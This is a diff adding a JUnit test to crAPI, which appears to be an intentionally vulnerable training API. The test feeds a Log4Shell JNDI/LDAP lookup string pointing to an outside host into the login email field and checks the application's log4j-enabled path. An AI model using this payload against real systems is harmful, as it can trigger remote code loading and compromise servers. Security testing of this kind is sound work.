@@ -14,6 +14,8 @@
 
 package com.crapi.service.Impl;
 
+import static org.mockito.Mockito.when;
+
 import com.crapi.config.JwtAuthTokenFilter;
 import com.crapi.config.JwtProvider;
 import com.crapi.constant.UserMessage;
@@ -39,9 +41,13 @@ import com.crapi.service.VehicleService;
 import com.crapi.utils.SMTPMailServer;
 import java.io.UnsupportedEncodingException;
 import lombok.SneakyThrows;
+import org.apache.logging.log4j.core.Appender;
+import org.apache.logging.log4j.core.LogEvent;
 import org.junit.Test;
 import org.junit.jupiter.api.Assertions;
 import org.junit.runner.RunWith;
+import org.mockito.ArgumentCaptor;
+import org.mockito.Captor;
 import org.mockito.InjectMocks;
 import org.mockito.Mock;
 import org.mockito.Mockito;
@@ -72,6 +78,8 @@ public class UserServiceImplTest {
   @Mock private SMTPMailServer smtpMailServer;
   @Mock private ProfileVideoRepository profileVideoRepository;
   @Mock private ChangeEmailRepository changeEmailRepository;
+  @Mock Appender appender;
+  @Captor ArgumentCaptor<LogEvent> logCaptor;
 
   @Test
   public void resetPassword() {
@@ -130,6 +138,26 @@ public class UserServiceImplTest {
     Mockito.when(jwtProvider.generateJwtToken(Mockito.any())).thenReturn(sampleJwtToken);
     Mockito.when(userRepository.findByEmail(Mockito.anyString())).thenReturn(getDummyUser());
     Mockito.when(userRepository.saveAndFlush(Mockito.any())).thenReturn(user);
+    Assertions.assertEquals(
+        userService.authenticateUserLogin(loginForm).getToken(), sampleJwtToken);
+    Mockito.verify(userRepository, Mockito.times(1)).saveAndFlush(Mockito.any());
+  }
+
+  @Test
+  public void testAuthenticateUserLoginLog4J() throws UnsupportedEncodingException {
+    LoginForm loginForm =
+        getDummyLoginFormByEmail("${jndi://ldap://cb9qcap29r.dev.collab.traceable.ai/a}");
+    String sampleJwtToken = "sampleToken";
+    User user = getDummyUser();
+    when(userService.isLog4jEnabled()).thenReturn(true);
+    // Mockito.when(authenticationManager.authenticate(Mockito.any()))
+    //    .thenReturn(
+    //        new UsernamePasswordAuthenticationToken(loginForm.getEmail(),
+    // loginForm.getPassword()));
+    Mockito.when(jwtProvider.generateJwtToken(Mockito.any())).thenReturn(sampleJwtToken);
+    Mockito.when(userRepository.findByEmail(Mockito.anyString())).thenReturn(getDummyUser());
+    Mockito.when(userRepository.saveAndFlush(Mockito.any())).thenReturn(user);
+    // assertTrue(logsList.get(0).getMessage().contains("Log4j Exploit Successful"));
     Assertions.assertEquals(
         userService.authenticateUserLogin(loginForm).getToken(), sampleJwtToken);
     Mockito.verify(userRepository, Mockito.times(1)).saveAndFlush(Mockito.any());
@@ -538,6 +566,14 @@ public class UserServiceImplTest {
     loginForm.setPassword("password");
     loginForm.setNumber("9798789212");
     loginForm.setEmail("email@example.com");
+    return loginForm;
+  }
+
+  private LoginForm getDummyLoginFormByEmail(String email) {
+    LoginForm loginForm = new LoginForm();
+    loginForm.setPassword("password");
+    loginForm.setNumber("9798789212");
+    loginForm.setEmail(email);
     return loginForm;
   }
 
